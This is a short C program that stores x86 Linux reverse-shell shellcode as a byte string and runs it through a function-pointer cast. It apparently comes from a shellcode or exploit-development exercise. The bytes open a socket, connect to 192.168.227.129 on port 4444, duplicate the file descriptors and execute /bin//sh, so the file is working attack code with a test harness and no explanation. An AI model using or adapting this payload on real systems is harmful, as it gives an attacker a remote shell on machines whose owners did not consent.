#include<stdio.h>
#include<string.h>

unsigned char code[] = \

"\x31\xd2\x6a\x66\x58\x52\x42\x52\x89\xd3\x42\x52\x89\xe1\xcd\x80\x89\xc3\x89\xd1\xb0\x3f\xcd\x80\x49\x79\xf9\x87\xda\x68"
"\xc0\xa8\xe3\x81" //IP address 192.168.227.129
"\x66\x68"
"\x11\x5c" // port 4444
"\x66\x53\x89\xe1\xb0\x66\x43\x6a\x10\x51\x52\x89\xe1\xcd\x80\xb0\x0b\x99\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xcd\x80";


main()
{
  printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
